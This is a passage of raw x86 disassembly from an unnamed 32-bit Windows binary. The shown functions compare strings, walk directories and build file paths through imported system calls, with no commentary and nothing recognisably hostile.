  405595:	c9                   	leave
  405596:	c3                   	ret
  405597:	8b 48 24             	mov    0x24(%eax),%ecx
  40559a:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  40559e:	53                   	push   %ebx
  40559f:	56                   	push   %esi
  4055a0:	57                   	push   %edi
  4055a1:	8b 78 20             	mov    0x20(%eax),%edi
  4055a4:	03 fa                	add    %edx,%edi
  4055a6:	03 ca                	add    %edx,%ecx
  4055a8:	83 78 18 00          	cmpl   $0x0,0x18(%eax)
  4055ac:	76 5e                	jbe    0x40560c
  4055ae:	eb 03                	jmp    0x4055b3
  4055b0:	8b 55 08             	mov    0x8(%ebp),%edx
  4055b3:	8b 75 0c             	mov    0xc(%ebp),%esi
  4055b6:	89 75 f8             	mov    %esi,-0x8(%ebp)
  4055b9:	8b 37                	mov    (%edi),%esi
  4055bb:	03 f2                	add    %edx,%esi
  4055bd:	8a 16                	mov    (%esi),%dl
  4055bf:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  4055c2:	88 55 ff             	mov    %dl,-0x1(%ebp)
  4055c5:	3a 13                	cmp    (%ebx),%dl
  4055c7:	75 1d                	jne    0x4055e6
  4055c9:	84 d2                	test   %dl,%dl
  4055cb:	74 15                	je     0x4055e2
  4055cd:	8a 56 01             	mov    0x1(%esi),%dl
  4055d0:	88 55 ff             	mov    %dl,-0x1(%ebp)
  4055d3:	3a 53 01             	cmp    0x1(%ebx),%dl
  4055d6:	75 0e                	jne    0x4055e6
  4055d8:	83 45 f8 02          	addl   $0x2,-0x8(%ebp)
  4055dc:	46                   	inc    %esi
  4055dd:	46                   	inc    %esi
  4055de:	84 d2                	test   %dl,%dl
  4055e0:	75 db                	jne    0x4055bd
  4055e2:	33 d2                	xor    %edx,%edx
  4055e4:	eb 05                	jmp    0x4055eb
  4055e6:	1b d2                	sbb    %edx,%edx
  4055e8:	83 da ff             	sbb    $0xffffffff,%edx
  4055eb:	85 d2                	test   %edx,%edx
  4055ed:	74 15                	je     0x405604
  4055ef:	83 c7 04             	add    $0x4,%edi
  4055f2:	41                   	inc    %ecx
  4055f3:	41                   	inc    %ecx
  4055f4:	ff 45 f4             	incl   -0xc(%ebp)
  4055f7:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4055fa:	3b 50 18             	cmp    0x18(%eax),%edx
  4055fd:	72 b1                	jb     0x4055b0
  4055ff:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405602:	eb 03                	jmp    0x405607
  405604:	0f b7 09             	movzwl (%ecx),%ecx
  405607:	8b 55 08             	mov    0x8(%ebp),%edx
  40560a:	eb 03                	jmp    0x40560f
  40560c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40560f:	8b 75 f4             	mov    -0xc(%ebp),%esi
  405612:	5f                   	pop    %edi
  405613:	3b 70 18             	cmp    0x18(%eax),%esi
  405616:	5e                   	pop    %esi
  405617:	5b                   	pop    %ebx
  405618:	0f 85 6c ff ff ff    	jne    0x40558a
  40561e:	33 c0                	xor    %eax,%eax
  405620:	c9                   	leave
  405621:	c3                   	ret
  405622:	55                   	push   %ebp
  405623:	8b ec                	mov    %esp,%ebp
  405625:	83 ec 24             	sub    $0x24,%esp
  405628:	53                   	push   %ebx
  405629:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40562c:	68 28 0b 41 00       	push   $0x410b28
  405631:	50                   	push   %eax
  405632:	68 1c 0b 41 00       	push   $0x410b1c
  405637:	ff 15 64 03 41 00    	call   *0x410364
  40563d:	59                   	pop    %ecx
  40563e:	50                   	push   %eax
  40563f:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405642:	ff 15 4c 02 41 00    	call   *0x41024c
  405648:	50                   	push   %eax
  405649:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40564c:	50                   	push   %eax
  40564d:	e8 ce a5 00 00       	call   0x40fc20
  405652:	83 c4 0c             	add    $0xc,%esp
  405655:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405658:	ff 15 54 02 41 00    	call   *0x410254
  40565e:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  405661:	ff 15 58 02 41 00    	call   *0x410258
  405667:	50                   	push   %eax
  405668:	ff 15 50 01 41 00    	call   *0x410150
  40566e:	85 c0                	test   %eax,%eax
  405670:	75 4a                	jne    0x4056bc
  405672:	ff 15 3c 01 41 00    	call   *0x41013c
  405678:	48                   	dec    %eax
  405679:	48                   	dec    %eax
  40567a:	74 34                	je     0x4056b0
  40567c:	48                   	dec    %eax
  40567d:	74 04                	je     0x405683
  40567f:	32 db                	xor    %bl,%bl
  405681:	eb 5b                	jmp    0x4056de
  405683:	6a 00                	push   $0x0
  405685:	8d 45 ff             	lea    -0x1(%ebp),%eax
  405688:	83 ec 10             	sub    $0x10,%esp
  40568b:	8b cc                	mov    %esp,%ecx
  40568d:	50                   	push   %eax
  40568e:	68 f8 0a 41 00       	push   $0x410af8
  405693:	ff 15 4c 02 41 00    	call   *0x41024c
  405699:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  40569e:	e8 f7 e3 ff ff       	call   0x403a9a
  4056a3:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4056a6:	ff 15 54 02 41 00    	call   *0x410254
  4056ac:	b0 01                	mov    $0x1,%al
  4056ae:	eb 39                	jmp    0x4056e9
  4056b0:	6a 00                	push   $0x0
  4056b2:	8d 45 fe             	lea    -0x2(%ebp),%eax
  4056b5:	83 ec 10             	sub    $0x10,%esp
  4056b8:	8b cc                	mov    %esp,%ecx
  4056ba:	eb d1                	jmp    0x40568d
  4056bc:	6a 00                	push   $0x0
  4056be:	8d 45 fe             	lea    -0x2(%ebp),%eax
  4056c1:	83 ec 10             	sub    $0x10,%esp
  4056c4:	8b cc                	mov    %esp,%ecx
  4056c6:	50                   	push   %eax
  4056c7:	68 d0 0a 41 00       	push   $0x410ad0
  4056cc:	ff 15 4c 02 41 00    	call   *0x41024c
  4056d2:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  4056d7:	e8 be e3 ff ff       	call   0x403a9a
  4056dc:	b3 01                	mov    $0x1,%bl
  4056de:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4056e1:	ff 15 54 02 41 00    	call   *0x410254
  4056e7:	8a c3                	mov    %bl,%al
  4056e9:	5b                   	pop    %ebx
  4056ea:	c9                   	leave
  4056eb:	c3                   	ret
  4056ec:	55                   	push   %ebp
  4056ed:	8b ec                	mov    %esp,%ebp
  4056ef:	83 ec 24             	sub    $0x24,%esp
  4056f2:	53                   	push   %ebx
  4056f3:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4056f6:	68 a4 0b 41 00       	push   $0x410ba4
  4056fb:	50                   	push   %eax
  4056fc:	68 1c 0b 41 00       	push   $0x410b1c
  405701:	ff 15 64 03 41 00    	call   *0x410364
  405707:	59                   	pop    %ecx
  405708:	50                   	push   %eax
  405709:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40570c:	ff 15 4c 02 41 00    	call   *0x41024c
  405712:	50                   	push   %eax
  405713:	8d 45 ec             	lea    -0x14(%ebp),%eax
  405716:	50                   	push   %eax
  405717:	e8 04 a5 00 00       	call   0x40fc20
  40571c:	83 c4 0c             	add    $0xc,%esp
  40571f:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405722:	ff 15 54 02 41 00    	call   *0x410254
  405728:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40572b:	ff 15 58 02 41 00    	call   *0x410258
  405731:	50                   	push   %eax
  405732:	ff 15 50 01 41 00    	call   *0x410150
  405738:	85 c0                	test   %eax,%eax
  40573a:	75 4a                	jne    0x405786
  40573c:	ff 15 3c 01 41 00    	call   *0x41013c
  405742:	48                   	dec    %eax
  405743:	48                   	dec    %eax
  405744:	74 34                	je     0x40577a
  405746:	48                   	dec    %eax
  405747:	74 04                	je     0x40574d
  405749:	32 db                	xor    %bl,%bl
  40574b:	eb 5b                	jmp    0x4057a8
  40574d:	6a 00                	push   $0x0
  40574f:	8d 45 ff             	lea    -0x1(%ebp),%eax
  405752:	83 ec 10             	sub    $0x10,%esp
  405755:	8b cc                	mov    %esp,%ecx
  405757:	50                   	push   %eax
  405758:	68 88 0b 41 00       	push   $0x410b88
  40575d:	ff 15 4c 02 41 00    	call   *0x41024c
  405763:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  405768:	e8 2d e3 ff ff       	call   0x403a9a
  40576d:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  405770:	ff 15 54 02 41 00    	call   *0x410254
  405776:	b0 01                	mov    $0x1,%al
  405778:	eb 39                	jmp    0x4057b3
  40577a:	6a 00                	push   $0x0
  40577c:	8d 45 fe             	lea    -0x2(%ebp),%eax
  40577f:	83 ec 10             	sub    $0x10,%esp
  405782:	8b cc                	mov    %esp,%ecx
  405784:	eb d1                	jmp    0x405757
  405786:	6a 00                	push   $0x0
  405788:	8d 45 fe             	lea    -0x2(%ebp),%eax
  40578b:	83 ec 10             	sub    $0x10,%esp
  40578e:	8b cc                	mov    %esp,%ecx
  405790:	50                   	push   %eax
  405791:	68 64 0b 41 00       	push   $0x410b64
  405796:	ff 15 4c 02 41 00    	call   *0x41024c
  40579c:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  4057a1:	e8 f4 e2 ff ff       	call   0x403a9a
  4057a6:	b3 01                	mov    $0x1,%bl
  4057a8:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4057ab:	ff 15 54 02 41 00    	call   *0x410254
  4057b1:	8a c3                	mov    %bl,%al
  4057b3:	5b                   	pop    %ebx
  4057b4:	c9                   	leave
  4057b5:	c3                   	ret
  4057b6:	55                   	push   %ebp
  4057b7:	8b ec                	mov    %esp,%ebp
  4057b9:	81 ec b8 01 00 00    	sub    $0x1b8,%esp
  4057bf:	53                   	push   %ebx
  4057c0:	56                   	push   %esi
  4057c1:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4057c4:	57                   	push   %edi
  4057c5:	50                   	push   %eax
  4057c6:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  4057c9:	ff 15 50 02 41 00    	call   *0x410250
  4057cf:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4057d2:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  4057d5:	50                   	push   %eax
  4057d6:	ff 15 50 02 41 00    	call   *0x410250
  4057dc:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4057df:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4057e2:	50                   	push   %eax
  4057e3:	ff 15 50 02 41 00    	call   *0x410250
  4057e9:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4057ec:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4057ef:	50                   	push   %eax
  4057f0:	68 44 0c 41 00       	push   $0x410c44
  4057f5:	ff 15 4c 02 41 00    	call   *0x41024c
  4057fb:	50                   	push   %eax
  4057fc:	68 1c 0b 41 00       	push   $0x410b1c
  405801:	ff 15 64 03 41 00    	call   *0x410364
  405807:	59                   	pop    %ecx
  405808:	50                   	push   %eax
  405809:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40580c:	50                   	push   %eax
  40580d:	e8 08 a4 00 00       	call   0x40fc1a
  405812:	83 c4 0c             	add    $0xc,%esp
  405815:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  405818:	50                   	push   %eax
  405819:	ff 15 64 02 41 00    	call   *0x410264
  40581f:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  405822:	ff 15 54 02 41 00    	call   *0x410254
  405828:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40582b:	ff 15 54 02 41 00    	call   *0x410254
  405831:	8d 85 48 fe ff ff    	lea    -0x1b8(%ebp),%eax
  405837:	50                   	push   %eax
  405838:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40583b:	68 f8 08 41 00       	push   $0x4108f8
  405840:	50                   	push   %eax
  405841:	8d 45 d8             	lea    -0x28(%ebp),%eax
  405844:	50                   	push   %eax
  405845:	e8 d6 a3 00 00       	call   0x40fc20
  40584a:	83 c4 0c             	add    $0xc,%esp
  40584d:	8b c8                	mov    %eax,%ecx
  40584f:	ff 15 58 02 41 00    	call   *0x410258
  405855:	50                   	push   %eax
  405856:	ff 15 34 01 41 00    	call   *0x410134
  40585c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40585f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405862:	ff 15 54 02 41 00    	call   *0x410254
  405868:	83 7d f8 ff          	cmpl   $0xffffffff,-0x8(%ebp)
  40586c:	75 2f                	jne    0x40589d
  40586e:	6a ff                	push   $0xffffffff
  405870:	ff 15 74 01 41 00    	call   *0x410174
  405876:	6a 00                	push   $0x0
  405878:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40587b:	83 ec 10             	sub    $0x10,%esp
  40587e:	8b cc                	mov    %esp,%ecx
  405880:	50                   	push   %eax
  405881:	68 20 0c 41 00       	push   $0x410c20
  405886:	ff 15 4c 02 41 00    	call   *0x41024c
  40588c:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  405891:	e8 04 e2 ff ff       	call   0x403a9a
  405896:	b3 01                	mov    $0x1,%bl
  405898:	e9 3f 02 00 00       	jmp    0x405adc
  40589d:	8d 85 48 fe ff ff    	lea    -0x1b8(%ebp),%eax
  4058a3:	50                   	push   %eax
  4058a4:	ff 75 f8             	push   -0x8(%ebp)
  4058a7:	ff 15 38 01 41 00    	call   *0x410138
  4058ad:	33 db                	xor    %ebx,%ebx
  4058af:	85 c0                	test   %eax,%eax
  4058b1:	0f 84 a1 01 00 00    	je     0x405a58
  4058b7:	6a 02                	push   $0x2
  4058b9:	5f                   	pop    %edi
  4058ba:	f6 85 48 fe ff ff 10 	testb  $0x10,-0x1b8(%ebp)
  4058c1:	0f 84 79 01 00 00    	je     0x405a40
  4058c7:	be d8 08 41 00       	mov    $0x4108d8,%esi
  4058cc:	8d 85 74 fe ff ff    	lea    -0x18c(%ebp),%eax
  4058d2:	8a 10                	mov    (%eax),%dl
  4058d4:	8a ca                	mov    %dl,%cl
  4058d6:	3a 16                	cmp    (%esi),%dl
  4058d8:	75 1a                	jne    0x4058f4
  4058da:	3a cb                	cmp    %bl,%cl
  4058dc:	74 12                	je     0x4058f0
  4058de:	8a 50 01             	mov    0x1(%eax),%dl
  4058e1:	8a ca                	mov    %dl,%cl
  4058e3:	3a 56 01             	cmp    0x1(%esi),%dl
  4058e6:	75 0c                	jne    0x4058f4
  4058e8:	03 c7                	add    %edi,%eax
  4058ea:	03 f7                	add    %edi,%esi
  4058ec:	3a cb                	cmp    %bl,%cl
  4058ee:	75 e2                	jne    0x4058d2
  4058f0:	33 c0                	xor    %eax,%eax
  4058f2:	eb 05                	jmp    0x4058f9
  4058f4:	1b c0                	sbb    %eax,%eax
  4058f6:	83 d8 ff             	sbb    $0xffffffff,%eax
  4058f9:	3b c3                	cmp    %ebx,%eax
  4058fb:	0f 84 3f 01 00 00    	je     0x405a40
  405901:	be 1c 0c 41 00       	mov    $0x410c1c,%esi
  405906:	8d 85 74 fe ff ff    	lea    -0x18c(%ebp),%eax
  40590c:	8a 10                	mov    (%eax),%dl
  40590e:	8a ca                	mov    %dl,%cl
  405910:	3a 16                	cmp    (%esi),%dl
  405912:	75 1a                	jne    0x40592e
  405914:	3a cb                	cmp    %bl,%cl
  405916:	74 12                	je     0x40592a
  405918:	8a 50 01             	mov    0x1(%eax),%dl
  40591b:	8a ca                	mov    %dl,%cl
  40591d:	3a 56 01             	cmp    0x1(%esi),%dl
  405920:	75 0c                	jne    0x40592e
  405922:	03 c7                	add    %edi,%eax
  405924:	03 f7                	add    %edi,%esi
  405926:	3a cb                	cmp    %bl,%cl
  405928:	75 e2                	jne    0x40590c
  40592a:	33 c0                	xor    %eax,%eax
  40592c:	eb 05                	jmp    0x405933
  40592e:	1b c0                	sbb    %eax,%eax
  405930:	83 d8 ff             	sbb    $0xffffffff,%eax
  405933:	3b c3                	cmp    %ebx,%eax
  405935:	0f 84 05 01 00 00    	je     0x405a40
  40593b:	8d 85 74 fe ff ff    	lea    -0x18c(%ebp),%eax
  405941:	68 0c 0c 41 00       	push   $0x410c0c
  405946:	50                   	push   %eax
  405947:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40594a:	50                   	push   %eax
  40594b:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40594e:	50                   	push   %eax
  40594f:	e8 cc a2 00 00       	call   0x40fc20
  405954:	83 c4 0c             	add    $0xc,%esp
  405957:	50                   	push   %eax
  405958:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40595b:	50                   	push   %eax
  40595c:	e8 bf a2 00 00       	call   0x40fc20
  405961:	83 c4 0c             	add    $0xc,%esp
  405964:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  405967:	50                   	push   %eax
  405968:	ff 15 64 02 41 00    	call   *0x410264
  40596e:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405971:	ff 15 54 02 41 00    	call   *0x410254
  405977:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  40597a:	ff 15 54 02 41 00    	call   *0x410254
  405980:	8d 85 74 fe ff ff    	lea    -0x18c(%ebp),%eax
  405986:	68 00 0c 41 00       	push   $0x410c00
  40598b:	50                   	push   %eax
  40598c:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40598f:	50                   	push   %eax
  405990:	8d 45 88             	lea    -0x78(%ebp),%eax
  405993:	50                   	push   %eax
  405994:	e8 87 a2 00 00       	call   0x40fc20
  405999:	83 c4 0c             	add    $0xc,%esp
  40599c:	50                   	push   %eax
  40599d:	8d 45 98             	lea    -0x68(%ebp),%eax
  4059a0:	50                   	push   %eax
  4059a1:	e8 7a a2 00 00       	call   0x40fc20
  4059a6:	83 c4 0c             	add    $0xc,%esp
  4059a9:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  4059ac:	50                   	push   %eax
  4059ad:	ff 15 64 02 41 00    	call   *0x410264
  4059b3:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  4059b6:	ff 15 54 02 41 00    	call   *0x410254
  4059bc:	8d 4d 88             	lea    -0x78(%ebp),%ecx
  4059bf:	ff 15 54 02 41 00    	call   *0x410254
  4059c5:	38 1d 69 57 41 00    	cmp    %bl,0x415769
  4059cb:	75 29                	jne    0x4059f6
  4059cd:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  4059d0:	ff 15 58 02 41 00    	call   *0x410258
  4059d6:	50                   	push   %eax
  4059d7:	ff 15 50 01 41 00    	call   *0x410150
  4059dd:	85 c0                	test   %eax,%eax
  4059df:	75 0e                	jne    0x4059ef
  4059e1:	ff 15 3c 01 41 00    	call   *0x41013c
  4059e7:	2b c7                	sub    %edi,%eax
  4059e9:	0f 85 b3 00 00 00    	jne    0x405aa2
  4059ef:	c6 05 69 57 41 00 01 	movb   $0x1,0x415769
  4059f6:	38 1d 68 57 41 00    	cmp    %bl,0x415768
  4059fc:	75 32                	jne    0x405a30
  4059fe:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  405a01:	ff 15 58 02 41 00    	call   *0x410258
  405a07:	50                   	push   %eax
  405a08:	ff 15 50 01 41 00    	call   *0x410150
  405a0e:	85 c0                	test   %eax,%eax
  405a10:	75 17                	jne    0x405a29
  405a12:	ff 15 3c 01 41 00    	call   *0x41013c
  405a18:	2b c7                	sub    %edi,%eax
  405a1a:	0f 85 8a 00 00 00    	jne    0x405aaa
  405a20:	c6 05 68 57 41 00 01 	movb   $0x1,0x415768
  405a27:	eb 07                	jmp    0x405a30
  405a29:	c6 05 69 57 41 00 01 	movb   $0x1,0x415769
  405a30:	38 1d 69 57 41 00    	cmp    %bl,0x415769
  405a36:	74 08                	je     0x405a40
  405a38:	38 1d 68 57 41 00    	cmp    %bl,0x415768
  405a3e:	75 72                	jne    0x405ab2
  405a40:	8d 85 48 fe ff ff    	lea    -0x1b8(%ebp),%eax
  405a46:	50                   	push   %eax
  405a47:	ff 75 f8             	push   -0x8(%ebp)
  405a4a:	ff 15 38 01 41 00    	call   *0x410138
  405a50:	85 c0                	test   %eax,%eax
  405a52:	0f 85 62 fe ff ff    	jne    0x4058ba
  405a58:	53                   	push   %ebx
  405a59:	8d 45 ff             	lea    -0x1(%ebp),%eax
  405a5c:	83 ec 10             	sub    $0x10,%esp
  405a5f:	8b cc                	mov    %esp,%ecx
  405a61:	50                   	push   %eax
  405a62:	68 20 0c 41 00       	push   $0x410c20
  405a67:	ff 15 4c 02 41 00    	call   *0x41024c
  405a6d:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  405a72:	e8 23 e0 ff ff       	call   0x403a9a
  405a77:	ff 75 f8             	push   -0x8(%ebp)
  405a7a:	ff 15 74 01 41 00    	call   *0x410174
  405a80:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  405a83:	ff 15 54 02 41 00    	call   *0x410254
  405a89:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  405a8c:	ff 15 54 02 41 00    	call   *0x410254
  405a92:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  405a95:	ff 15 54 02 41 00    	call   *0x410254
  405a9b:	b0 01                	mov    $0x1,%al
  405a9d:	5f                   	pop    %edi
  405a9e:	5e                   	pop    %esi
  405a9f:	5b                   	pop    %ebx
  405aa0:	c9                   	leave
  405aa1:	c3                   	ret
  405aa2:	88 1d 69 57 41 00    	mov    %bl,0x415769
  405aa8:	eb 29                	jmp    0x405ad3
  405aaa:	88 1d 68 57 41 00    	mov    %bl,0x415768
  405ab0:	eb 21                	jmp    0x405ad3
  405ab2:	53                   	push   %ebx
  405ab3:	8d 45 ff             	lea    -0x1(%ebp),%eax
  405ab6:	83 ec 10             	sub    $0x10,%esp
  405ab9:	8b cc                	mov    %esp,%ecx
  405abb:	50                   	push   %eax
  405abc:	68 dc 0b 41 00       	push   $0x410bdc
  405ac1:	ff 15 4c 02 41 00    	call   *0x41024c
  405ac7:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  405acc:	e8 c9 df ff ff       	call   0x403a9a
  405ad1:	b3 01                	mov    $0x1,%bl
  405ad3:	ff 75 f8             	push   -0x8(%ebp)
  405ad6:	ff 15 74 01 41 00    	call   *0x410174
  405adc:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  405adf:	ff 15 54 02 41 00    	call   *0x410254
  405ae5:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  405ae8:	ff 15 54 02 41 00    	call   *0x410254
  405aee:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  405af1:	ff 15 54 02 41 00    	call   *0x410254
  405af7:	8a c3                	mov    %bl,%al
  405af9:	eb a2                	jmp    0x405a9d
  405afb:	55                   	push   %ebp
  405afc:	8b ec                	mov    %esp,%ebp
  405afe:	81 ec 88 01 00 00    	sub    $0x188,%esp
  405b04:	53                   	push   %ebx
  405b05:	8d 45 ff             	lea    -0x1(%ebp),%eax
  405b08:	56                   	push   %esi
  405b09:	50                   	push   %eax
  405b0a:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  405b0d:	ff 15 50 02 41 00    	call   *0x410250
  405b13:	8d 45 ff             	lea    -0x1(%ebp),%eax
  405b16:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  405b19:	50                   	push   %eax
  405b1a:	ff 15 50 02 41 00    	call   *0x410250
  405b20:	8d 45 ff             	lea    -0x1(%ebp),%eax
  405b23:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405b26:	50                   	push   %eax
  405b27:	68 44 0c 41 00       	push   $0x410c44
  405b2c:	ff 15 4c 02 41 00    	call   *0x41024c
  405b32:	50                   	push   %eax
  405b33:	68 1c 0b 41 00       	push   $0x410b1c
  405b38:	ff 15 64 03 41 00    	call   *0x410364
  405b3e:	59                   	pop    %ecx
  405b3f:	50                   	push   %eax
  405b40:	8d 45 b8             	lea    -0x48(%ebp),%eax
  405b43:	50                   	push   %eax
  405b44:	e8 d1 a0 00 00       	call   0x40fc1a
  405b49:	83 c4 0c             	add    $0xc,%esp
  405b4c:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  405b4f:	50                   	push   %eax
  405b50:	ff 15 64 02 41 00    	call   *0x410264
  405b56:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  405b59:	ff 15 54 02 41 00    	call   *0x410254
  405b5f:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405b62:	ff 15 54 02 41 00    	call   *0x410254
  405b68:	8d 85 78 fe ff ff    	lea    -0x188(%ebp),%eax
  405b6e:	50                   	push   %eax
  405b6f:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405b72:	68 f8 08 41 00       	push   $0x4108f8
  405b77:	50                   	push   %eax
  405b78:	8d 45 d8             	lea    -0x28(%ebp),%eax
  405b7b:	50                   	push   %eax
  405b7c:	e8 9f a0 00 00       	call   0x40fc20
  405b81:	83 c4 0c             	add    $0xc,%esp
  405b84:	8b c8                	mov    %eax,%ecx
  405b86:	ff 15 58 02 41 00    	call   *0x410258
  405b8c:	50                   	push   %eax
  405b8d:	ff 15 34 01 41 00    	call   *0x410134
  405b93:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405b96:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405b99:	ff 15 54 02 41 00    	call   *0x410254
  405b9f:	83 7d f8 ff          	cmpl   $0xffffffff,-0x8(%ebp)
  405ba3:	75 1d                	jne    0x405bc2
  405ba5:	6a ff                	push   $0xffffffff
  405ba7:	ff 15 74 01 41 00    	call   *0x410174
  405bad:	6a 00                	push   $0x0
  405baf:	8d 45 ff             	lea    -0x1(%ebp),%eax
  405bb2:	83 ec 10             	sub    $0x10,%esp
  405bb5:	8b cc                	mov    %esp,%ecx
  405bb7:	50                   	push   %eax
  405bb8:	68 a4 0c 41 00       	push   $0x410ca4
  405bbd:	e9 29 01 00 00       	jmp    0x405ceb
  405bc2:	8d 85 78 fe ff ff    	lea    -0x188(%ebp),%eax
  405bc8:	50                   	push   %eax
  405bc9:	ff 75 f8             	push   -0x8(%ebp)
  405bcc:	ff 15 38 01 41 00    	call   *0x410138
  405bd2:	33 db                	xor    %ebx,%ebx
  405bd4:	85 c0                	test   %eax,%eax
  405bd6:	0f 84 37 01 00 00    	je     0x405d13
  405bdc:	f6 85 78 fe ff ff 10 	testb  $0x10,-0x188(%ebp)
  405be3:	0f 84 d3 00 00 00    	je     0x405cbc
  405be9:	be d8 08 41 00       	mov    $0x4108d8,%esi
  405bee:	8d 85 a4 fe ff ff    	lea    -0x15c(%ebp),%eax
  405bf4:	8a 10                	mov    (%eax),%dl
  405bf6:	8a ca                	mov    %dl,%cl
  405bf8:	3a 16                	cmp    (%esi),%dl
  405bfa:	75 1a                	jne    0x405c16
  405bfc:	3a cb                	cmp    %bl,%cl
  405bfe:	74 12                	je     0x405c12
  405c00:	8a 50 01             	mov    0x1(%eax),%dl
  405c03:	8a ca                	mov    %dl,%cl
  405c05:	3a 56 01             	cmp    0x1(%esi),%dl
  405c08:	75 0c                	jne    0x405c16
  405c0a:	40                   	inc    %eax
  405c0b:	40                   	inc    %eax
  405c0c:	46                   	inc    %esi
  405c0d:	46                   	inc    %esi
  405c0e:	3a cb                	cmp    %bl,%cl
  405c10:	75 e2                	jne    0x405bf4
  405c12:	33 c0                	xor    %eax,%eax
  405c14:	eb 05                	jmp    0x405c1b
  405c16:	1b c0                	sbb    %eax,%eax
  405c18:	83 d8 ff             	sbb    $0xffffffff,%eax
  405c1b:	3b c3                	cmp    %ebx,%eax
  405c1d:	0f 84 99 00 00 00    	je     0x405cbc
  405c23:	be 1c 0c 41 00       	mov    $0x410c1c,%esi
  405c28:	8d 85 a4 fe ff ff    	lea    -0x15c(%ebp),%eax
  405c2e:	8a 10                	mov    (%eax),%dl
  405c30:	8a ca                	mov    %dl,%cl
  405c32:	3a 16                	cmp    (%esi),%dl
  405c34:	75 1a                	jne    0x405c50
  405c36:	3a cb                	cmp    %bl,%cl
  405c38:	74 12                	je     0x405c4c
  405c3a:	8a 50 01             	mov    0x1(%eax),%dl
  405c3d:	8a ca                	mov    %dl,%cl
  405c3f:	3a 56 01             	cmp    0x1(%esi),%dl
  405c42:	75 0c                	jne    0x405c50
  405c44:	40                   	inc    %eax
  405c45:	40                   	inc    %eax
  405c46:	46                   	inc    %esi
  405c47:	46                   	inc    %esi
  405c48:	3a cb                	cmp    %bl,%cl
  405c4a:	75 e2                	jne    0x405c2e
  405c4c:	33 c0                	xor    %eax,%eax
  405c4e:	eb 05                	jmp    0x405c55
  405c50:	1b c0                	sbb    %eax,%eax
  405c52:	83 d8 ff             	sbb    $0xffffffff,%eax
  405c55:	3b c3                	cmp    %ebx,%eax
  405c57:	74 63                	je     0x405cbc
  405c59:	8d 85 a4 fe ff ff    	lea    -0x15c(%ebp),%eax
  405c5f:	68 94 0c 41 00       	push   $0x410c94
  405c64:	50                   	push   %eax
  405c65:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405c68:	50                   	push   %eax
  405c69:	8d 45 b8             	lea    -0x48(%ebp),%eax
  405c6c:	50                   	push   %eax
  405c6d:	e8 ae 9f 00 00       	call   0x40fc20
  405c72:	83 c4 0c             	add    $0xc,%esp
  405c75:	50                   	push   %eax
  405c76:	8d 45 d8             	lea    -0x28(%ebp),%eax
  405c79:	50                   	push   %eax
  405c7a:	e8 a1 9f 00 00       	call   0x40fc20
  405c7f:	83 c4 0c             	add    $0xc,%esp
  405c82:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  405c85:	50                   	push   %eax
  405c86:	ff 15 64 02 41 00    	call   *0x410264
  405c8c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405c8f:	ff 15 54 02 41 00    	call   *0x410254
